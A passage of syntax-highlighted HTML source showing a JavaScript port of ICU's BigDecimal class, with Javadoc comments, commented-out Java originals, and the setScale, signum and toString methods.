class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  scale The &lt;code&gt;int&lt;/code&gt; specifying the scale of the</span></span><br><span class="line"><span class="comment">  *               resulting &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @return       A plain &lt;code&gt;BigDecimal&lt;/code&gt; with the given scale.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;scale&lt;/code&gt; is negative.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if reducing scale would discard</span></span><br><span class="line"><span class="comment">  *               non-zero digits.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal setScale(int scale)&#123;</span></span><br><span class="line"> <span class="comment">//-- return setScale(scale,ROUND_UNNECESSARY);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; with a given scale.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the given scale (which must be zero or positive) is the same as</span></span><br><span class="line"><span class="comment">  * or greater than the length of the decimal part (the scale) of this</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; then trailing zeros will be added to the</span></span><br><span class="line"><span class="comment">  * decimal part as necessary.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the given scale is less than the length of the decimal part (the</span></span><br><span class="line"><span class="comment">  * scale) of this &lt;code&gt;BigDecimal&lt;/code&gt; then trailing digits</span></span><br><span class="line"><span class="comment">  * will be removed, and the rounding mode given by the second</span></span><br><span class="line"><span class="comment">  * parameter is used to determine if the remaining digits are</span></span><br><span class="line"><span class="comment">  * affected by a carry.</span></span><br><span class="line"><span class="comment">  * In this case, an &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;round&lt;/code&gt; is not a valid rounding mode.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If &lt;code&gt;round&lt;/code&gt; is &lt;code&gt;MathContext.ROUND_UNNECESSARY&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown if any discarded</span></span><br><span class="line"><span class="comment">  * digits are non-zero.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  scale The &lt;code&gt;int&lt;/code&gt; specifying the scale of the</span></span><br><span class="line"><span class="comment">  *               resulting &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @param  round The &lt;code&gt;int&lt;/code&gt; rounding mode to be used for</span></span><br><span class="line"><span class="comment">  *               the division (see the &#123;@link MathContext&#125; class).</span></span><br><span class="line"><span class="comment">  * @return       A plain &lt;code&gt;BigDecimal&lt;/code&gt; with the given scale.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException if &lt;code&gt;round&lt;/code&gt; is not a</span></span><br><span class="line"><span class="comment">  *               valid rounding mode.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;scale&lt;/code&gt; is negative.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;round&lt;/code&gt; is</span></span><br><span class="line"><span class="comment">  *               &lt;code&gt;MathContext.ROUND_UNNECESSARY&lt;/code&gt;, and</span></span><br><span class="line"><span class="comment">  *               reducing scale would discard non-zero digits.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal setScale(int scale,int round)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">setScale</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> round;</span><br><span class="line">  <span class="keyword">if</span> (setScale.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    round = setScale.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (setScale.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    round = <span class="keyword">this</span>.ROUND_UNNECESSARY;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"setScale(): "</span> + setScale.arguments.length + <span class="string">" given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> scale = setScale.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">//--int ourscale;</span></span><br><span class="line">  <span class="keyword">var</span> ourscale;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal res;</span></span><br><span class="line">  <span class="keyword">var</span> res;</span><br><span class="line">  <span class="comment">//--int padding=0;</span></span><br><span class="line">  <span class="keyword">var</span> padding=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int newlen=0;</span></span><br><span class="line">  <span class="keyword">var</span> newlen=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// at present this naughtily only checks the round value if it is</span></span><br><span class="line">  <span class="comment">// needed (used), for speed</span></span><br><span class="line">  ourscale=<span class="keyword">this</span>.scale();</span><br><span class="line">  <span class="keyword">if</span> (ourscale==scale)  <span class="comment">// already correct scale</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.form==MathContext.prototype.PLAIN)  <span class="comment">// .. and form</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  res=<span class="keyword">this</span>.clone(<span class="keyword">this</span>); <span class="comment">// need copy</span></span><br><span class="line">  <span class="keyword">if</span> (ourscale&lt;=scale)</span><br><span class="line">   &#123; <span class="comment">// simply zero-padding/changing form</span></span><br><span class="line">    <span class="comment">// if ourscale is 0 we may have lots of 0s to add</span></span><br><span class="line">    <span class="keyword">if</span> (ourscale==<span class="number">0</span>)</span><br><span class="line">     padding=res.exp+scale;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     padding=scale-ourscale;</span><br><span class="line">    res.mant=<span class="keyword">this</span>.extend(res.mant,res.mant.length+padding);</span><br><span class="line">    res.exp=-scale; <span class="comment">// as requested</span></span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="comment">/* ourscale&gt;scale: shortening, probably */</span></span><br><span class="line">    <span class="keyword">if</span> (scale&lt;<span class="number">0</span>)</span><br><span class="line">     <span class="comment">//--throw new java.lang.ArithmeticException("Negative scale:"+" "+scale);</span></span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"setScale(): Negative scale: "</span> + scale;</span><br><span class="line">    <span class="comment">// [round() will raise exception if invalid round]</span></span><br><span class="line">    newlen=res.mant.length-((ourscale-scale)); <span class="comment">// [&lt;=0 is OK]</span></span><br><span class="line">    res=res.round(newlen,round); <span class="comment">// round to required length</span></span><br><span class="line">    <span class="comment">// This could have shifted left if round (say) 0.9-&gt;1[.0]</span></span><br><span class="line">    <span class="comment">// Repair if so by adding a zero and reducing exponent</span></span><br><span class="line">    <span class="keyword">if</span> (res.exp!=(-scale))</span><br><span class="line">     &#123;</span><br><span class="line">      res.mant=<span class="keyword">this</span>.extend(res.mant,res.mant.length+<span class="number">1</span>);</span><br><span class="line">      res.exp=res.exp<span class="number">-1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  res.form=MathContext.prototype.PLAIN; <span class="comment">// by definition</span></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;short&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part or is</span></span><br><span class="line"><span class="comment">  * out of the possible range for a &lt;code&gt;short&lt;/code&gt; (16-bit signed</span></span><br><span class="line"><span class="comment">  * integer) result then an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;short&lt;/code&gt; equal in value to &lt;code&gt;this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero</span></span><br><span class="line"><span class="comment">  *                 decimal part, or will not fit in a</span></span><br><span class="line"><span class="comment">  *                 &lt;code&gt;short&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public short shortValueExact()&#123;</span></span><br><span class="line"> <span class="comment">//-- int num;</span></span><br><span class="line"> <span class="comment">//-- num=this.intValueExact(); // will check decimal part too</span></span><br><span class="line"> <span class="comment">//-- if ((num&gt;32767)|(num&lt;(-32768)))</span></span><br><span class="line"> <span class="comment">//--  throw new java.lang.ArithmeticException("Conversion overflow:"+" "+this.toString());</span></span><br><span class="line"> <span class="comment">//-- return (short)num;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the sign of this &lt;code&gt;BigDecimal&lt;/code&gt;, as an</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;int&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * This returns the &lt;i&gt;signum&lt;/i&gt; function value that represents the</span></span><br><span class="line"><span class="comment">  * sign of this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * That is, -1 if the &lt;code&gt;BigDecimal&lt;/code&gt; is negative, 0 if it is</span></span><br><span class="line"><span class="comment">  * numerically equal to zero, or 1 if it is positive.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return An &lt;code&gt;int&lt;/code&gt; which is -1 if the</span></span><br><span class="line"><span class="comment">  *         &lt;code&gt;BigDecimal&lt;/code&gt; is negative, 0 if it is</span></span><br><span class="line"><span class="comment">  *         numerically equal to zero, or 1 if it is positive.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int signum()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">signum</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.ind; <span class="comment">// [note this assumes values for ind.]</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;java.math.BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * This is an exact conversion; the result is the same as if the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; were formatted as a plain number without</span></span><br><span class="line"><span class="comment">  * any rounding or exponent and then the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;java.math.BigDecimal(java.lang.String)&lt;/code&gt; constructor</span></span><br><span class="line"><span class="comment">  * were used to construct the result.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;i&gt;(Note: this method is provided only in the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;com.ibm.icu.math&lt;/code&gt; version of the BigDecimal class.</span></span><br><span class="line"><span class="comment">  * It would not be present in a &lt;code&gt;java.math&lt;/code&gt; version.)&lt;/i&gt;</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return The &lt;code&gt;java.math.BigDecimal&lt;/code&gt; equal in value</span></span><br><span class="line"><span class="comment">  *         to this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public java.math.BigDecimal toBigDecimal()&#123;</span></span><br><span class="line"> <span class="comment">//-- return new java.math.BigDecimal(this.unscaledValue(),this.scale());</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;java.math.BigInteger&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Any decimal part is truncated (discarded).</span></span><br><span class="line"><span class="comment">  * If an exception is desired should the decimal part be non-zero,</span></span><br><span class="line"><span class="comment">  * use &#123;@link #toBigIntegerExact()&#125;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return The &lt;code&gt;java.math.BigInteger&lt;/code&gt; equal in value</span></span><br><span class="line"><span class="comment">  *         to the integer part of this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public java.math.BigInteger toBigInteger()&#123;</span></span><br><span class="line"> <span class="comment">//-- com.ibm.icu.math.BigDecimal res=null;</span></span><br><span class="line"> <span class="comment">//-- int newlen=0;</span></span><br><span class="line"> <span class="comment">//-- byte newmant[]=null;</span></span><br><span class="line"> <span class="comment">//-- &#123;/*select*/</span></span><br><span class="line"> <span class="comment">//-- if ((exp&gt;=0)&amp;(form==com.ibm.icu.math.MathContext.PLAIN))</span></span><br><span class="line"> <span class="comment">//--  res=this; // can layout simply</span></span><br><span class="line"> <span class="comment">//-- else if (exp&gt;=0)</span></span><br><span class="line"> <span class="comment">//--  &#123;</span></span><br><span class="line"> <span class="comment">//--   res=clone(this); // safe copy</span></span><br><span class="line"> <span class="comment">//--   res.form=(byte)com.ibm.icu.math.MathContext.PLAIN; // .. and request PLAIN</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- else&#123;</span></span><br><span class="line"> <span class="comment">//--  &#123; // exp&lt;0; scale to be truncated</span></span><br><span class="line"> <span class="comment">//--   // we could use divideInteger, but we may as well be quicker</span></span><br><span class="line"> <span class="comment">//--   if (((int)-this.exp)&gt;=this.mant.length)</span></span><br><span class="line"> <span class="comment">//--    res=ZERO; // all blows away</span></span><br><span class="line"> <span class="comment">//--   else</span></span><br><span class="line"> <span class="comment">//--    &#123;</span></span><br><span class="line"> <span class="comment">//--     res=clone(this); // safe copy</span></span><br><span class="line"> <span class="comment">//--     newlen=res.mant.length+res.exp;</span></span><br><span class="line"> <span class="comment">//--     newmant=new byte[newlen]; // [shorter]</span></span><br><span class="line"> <span class="comment">//--     java.lang.System.arraycopy((java.lang.Object)res.mant,0,(java.lang.Object)newmant,0,newlen);</span></span><br><span class="line"> <span class="comment">//--     res.mant=newmant;</span></span><br><span class="line"> <span class="comment">//--     res.form=(byte)com.ibm.icu.math.MathContext.PLAIN;</span></span><br><span class="line"> <span class="comment">//--     res.exp=0;</span></span><br><span class="line"> <span class="comment">//--    &#125;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"> <span class="comment">//-- return new BigInteger(new java.lang.String(res.layout()));</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;java.math.BigInteger&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * An exception is thrown if the decimal part (if any) is non-zero.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return The &lt;code&gt;java.math.BigInteger&lt;/code&gt; equal in value</span></span><br><span class="line"><span class="comment">  *         to the integer part of this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero</span></span><br><span class="line"><span class="comment">  *         decimal part.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public java.math.BigInteger toBigIntegerExact()&#123;</span></span><br><span class="line"> <span class="comment">//-- /* test any trailing decimal part */</span></span><br><span class="line"> <span class="comment">//-- if (exp&lt;0)</span></span><br><span class="line"> <span class="comment">//--  &#123; // possible decimal part</span></span><br><span class="line"> <span class="comment">//--   /* all decimal places must be 0; note exp&lt;0 */</span></span><br><span class="line"> <span class="comment">//--   if ((!(allzero(mant,mant.length+exp))))</span></span><br><span class="line"> <span class="comment">//--    throw new java.lang.ArithmeticException("Decimal part non-zero:"+" "+this.toString());</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- return toBigInteger();</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the &lt;code&gt;BigDecimal&lt;/code&gt; as a character array.</span></span><br><span class="line"><span class="comment">  * The result of this method is the same as using the</span></span><br><span class="line"><span class="comment">  * sequence &lt;code&gt;toString().toCharArray()&lt;/code&gt;, but avoids creating</span></span><br><span class="line"><span class="comment">  * the intermediate &lt;code&gt;String&lt;/code&gt; and &lt;code&gt;char[]&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * objects.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return The &lt;code&gt;char[]&lt;/code&gt; array corresponding to this</span></span><br><span class="line"><span class="comment">  *         &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public char[] toCharArray()&#123;</span></span><br><span class="line"> <span class="comment">//-- return layout();</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the &lt;code&gt;BigDecimal&lt;/code&gt; as a &lt;code&gt;String&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * This returns a &lt;code&gt;String&lt;/code&gt; that exactly represents this</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt;, as defined in the decimal documentation</span></span><br><span class="line"><span class="comment">  * (see &#123;@link BigDecimal class header&#125;).</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * By definition, using the &#123;@link #BigDecimal(String)&#125; constructor</span></span><br><span class="line"><span class="comment">  * on the result &lt;code&gt;String&lt;/code&gt; will create a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; that is exactly equal to the original</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return The &lt;code&gt;String&lt;/code&gt; exactly corresponding to this</span></span><br><span class="line"><span class="comment">  *         &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @see    #format(int, int)</span></span><br><span class="line"><span class="comment">  * @see    #format(int, int, int, int, int, int)</span></span><br><span class="line"><span class="comment">  * @see    #toCharArray()</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public java.lang.String toString()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.layout().join(<span class="string">""</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the number as a &lt;code&gt;BigInteger&lt;/code&gt; after removing the</span></span><br><span class="line"><span class="comment">  * scale.</span></span><br><span class="line"><span class="comment">  * That is, the number is expressed as a plain number, any decimal</span></span><br><span class="line"><span class="comment">  * point is then removed (retaining the digits of any decimal part),</span></span><br><span class="line"><span class="comment">  * and the result is then converted to a &lt;code&gt;BigInteger&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return The &lt;code&gt;java.math.BigInteger&lt;/code&gt; equal in value to</span></span><br><span class="line"><span class="comment">  *         this &lt;code&gt;BigDecimal&lt;/code&gt; multiplied by ten to the</span></span><br><span class="line"><span class="comment">  *         power of &lt;code&gt;this.scale()&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public java.math.BigInteger unscaledValue()&#123;</span></span><br><span class="line"> <span class="comment">//-- com.ibm.icu.math.BigDecimal res=null;</span></span><br><span class="line"> <span class="comment">//-- if (exp&gt;=0)</span></span><br><span class="line"> <span class="comment">//--  res=this;</span></span><br><span class="line"> <span class="comment">//-- else</span></span><br><span class="line"> <span class="comment">//--  &#123;</span></span><br><span class="line"> <span class="comment">//--   res=clone(this); // safe copy</span></span><br><span class="line"> <span class="comment">//--   res.exp=0; // drop scale</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- return res.toBigInteger();</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Translates a &lt;code&gt;double&lt;/code&gt; to a &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; which is the decimal</span></span><br><span class="line"><span class="comment">  * representation of the 64-bit signed binary floating point</span></span><br><span class="line"><span class="comment">  * parameter. If the parameter is infinite, or is not a number (NaN),</span></span><br><span class="line"><span class="comment">  * a &lt;code&gt;NumberFormatException&lt;/code&gt; is thrown.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The number is constructed as though &lt;code&gt;num&lt;/code&gt; had been</span></span><br><span class="line"><span class="comment">  * converted to a &lt;code&gt;String&lt;/code&gt; using the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;Double.toString()&lt;/code&gt; method and the</span></span><br><span class="line"><span class="comment">  * &#123;@link #BigDecimal(java.lang.String)&#125; constructor had then been used.</span></span><br><span class="line"><span class="comment">  * This is typically not an exact conversion.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  dub The &lt;code&gt;double&lt;/code&gt; to be translated.</span></span><br><span class="line"><span class="comment">  * @return     The &lt;code&gt;BigDecimal&lt;/code&gt; equal in value to</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;dub&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws NumberFormatException if the parameter is infinite or</span></span><br><span class="line"><span class="comment">  *             not a number.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public static com.ibm.icu.math.BigDecimal valueOf(double dub)&#123;</span></span><br><span class="line"> <span class="comment">//-- // Reminder: a zero double returns '0.0', so we cannot fastpath to</span></span><br><span class="line"> <span class="comment">//-- // use the constant ZERO.  This might be important enough to justify</span></span><br><span class="line"> <span class="comment">//-- // a factory approach, a cache, or a few private constants, later.</span></span><br><span class="line"> <span class="comment">//-- return new com.ibm.icu.math.BigDecimal((new java.lang.Double(dub)).toString());</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Translates a &lt;code&gt;long&lt;/code&gt; to a &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * That is, returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * equal to the given &lt;code&gt;long&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  lint The &lt;code&gt;long&lt;/code&gt; to be translated.</span></span><br><span class="line"><span class="comment">  * @return      The &lt;code&gt;BigDecimal&lt;/code&gt; equal in value to</span></span><br><span class="line"><span class="comment">  *              &lt;code&gt;lint&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public static com.ibm.icu.math.BigDecimal valueOf(long lint)&#123;</span></span><br><span class="line"> <span class="comment">//-- return valueOf(lint,0);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Translates a &lt;code&gt;long&lt;/code&gt; to a &lt;code&gt;BigDecimal&lt;/code&gt; with a</span></span><br><span class="line"><span class="comment">  * given scale.</span></span><br><span class="line"><span class="comment">  * That is, returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose unscaled</span></span><br><span class="line"><span class="comment">  * value is equal to the given &lt;code&gt;long&lt;/code&gt;, adjusted by the</span></span><br><span class="line"><span class="comment">  * second parameter, &lt;code&gt;scale&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The result is given by:</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;&lt;code&gt;</span></span><br><span class="line"><span class="comment">  * (new BigDecimal(lint)).divide(TEN.pow(new BigDecimal(scale)))</span></span><br><span class="line"><span class="comment">  * &lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * A &lt;code&gt;NumberFormatException&lt;/code&gt; is thrown if &lt;code&gt;scale&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * is negative.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  lint  The &lt;code&gt;long&lt;/code&gt; to be translated.</span></span><br><span class="line"><span class="comment">  * @param  scale The &lt;code&gt;int&lt;/code&gt; scale to be applied.</span></span><br><span class="line"><span class="comment">  * @return       The &lt;code&gt;BigDecimal&lt;/code&gt; equal in value to</span></span><br><span class="line"><span class="comment">  *               &lt;code&gt;lint&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws NumberFormatException if the scale is negative.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public static com.ibm.icu.math.BigDecimal valueOf(long lint,int scale)&#123;</span></span><br><span class="line"> <span class="comment">//-- com.ibm.icu.math.BigDecimal res=null;</span></span><br><span class="line"> <span class="comment">//-- &#123;/*select*/</span></span><br><span class="line"> <span class="comment">//-- if (lint==0)</span></span><br><span class="line"> <span class="comment">//--  res=ZERO;</span></span><br><span class="line"> <span class="comment">//-- else if (lint==1)</span></span><br><span class="line"> <span class="comment">//--  res=ONE;</span></span><br><span class="line"> <span class="comment">//-- else if (lint==10)</span></span><br><span class="line"> <span class="comment">//--  res=TEN;</span></span><br><span class="line"> <span class="comment">//-- else&#123;</span></span><br><span class="line"> <span class="comment">//--  res=new com.ibm.icu.math.BigDecimal(lint);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"> <span class="comment">//-- if (scale==0)</span></span><br><span class="line"> <span class="comment">//--  return res;</span></span><br><span class="line"> <span class="comment">//-- if (scale&lt;0)</span></span><br><span class="line"> <span class="comment">//--  throw new java.lang.NumberFormatException("Negative scale:"+" "+scale);</span></span><br><span class="line"> <span class="comment">//-- res=clone(res); // safe copy [do not mutate]</span></span><br><span class="line"> <span class="comment">//-- res.exp=(int)-scale; // exponent is -scale</span></span><br><span class="line"> <span class="comment">//-- return res;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ---------------------------------------------------------------- */</span></span><br><span class="line"> <span class="comment">/* Private methods                                                  */</span></span><br><span class="line"> <span class="comment">/* ---------------------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Return char array value of a BigDecimal (conversion from</span></span><br><span class="line"><span class="comment">       BigDecimal to laid-out canonical char array).</span></span><br><span class="line"><span class="comment">    &lt;p&gt;The mantissa will either already have been rounded 